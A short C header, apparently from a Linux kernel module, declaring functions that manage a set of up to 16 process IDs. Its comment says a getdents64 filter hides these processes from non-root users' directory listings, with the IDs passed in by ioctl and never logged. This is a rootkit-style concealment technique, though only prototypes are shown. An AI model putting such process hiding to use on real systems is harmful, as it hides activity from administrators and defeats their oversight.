#ifndef WUWA_HIDE_H
#define WUWA_HIDE_H

#include <linux/pid.h>
#include <linux/types.h>

/* Hidden-pid set: which pids the getdents64 filter removes for non-root
 * readers. Values arrive at runtime via ioctl only (never compiled in,
 * never logged). Fixed capacity, no allocations (exit-safe). */
#define WUWA_HIDE_MAX 16

int wuwa_hide_add(pid_t pid);
int wuwa_hide_del(pid_t pid);
void wuwa_hide_clear(void);
int wuwa_hide_count(void);
bool wuwa_hide_contains(pid_t pid);

#endif /* WUWA_HIDE_H */
